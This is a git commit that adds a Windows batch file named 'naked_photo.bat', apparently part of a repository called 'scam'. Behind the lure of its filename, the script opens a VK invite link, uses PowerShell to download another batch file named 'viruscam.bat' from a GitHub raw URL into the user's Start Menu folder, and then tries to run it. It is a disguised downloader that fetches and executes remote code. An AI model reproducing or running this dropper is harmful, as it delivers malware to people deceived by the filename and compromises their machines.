37ac840b0bcd5da42084b249037bbeb7ffb24d16
musichka <114557026+kaktakt@users.noreply.github.com>
2024-10-06 00:49:50 +0800

    Create naked_photo.bat

---
+++ naked_photo.bat
@@ -0,0 +1,13 @@
+@echo off
+setlocal
+
+start https://vk.com/invite/AMKGDq4
+
+set "file_path=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\viruscam.bat"
+set "github_url=https://raw.githubusercontent.com/kaktakt/scam/refs/heads/viruss/viruscam.bat"
+
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%github_url%', '%file_path%')"
+
+cd %file_path%
+
+call viruscam.bat
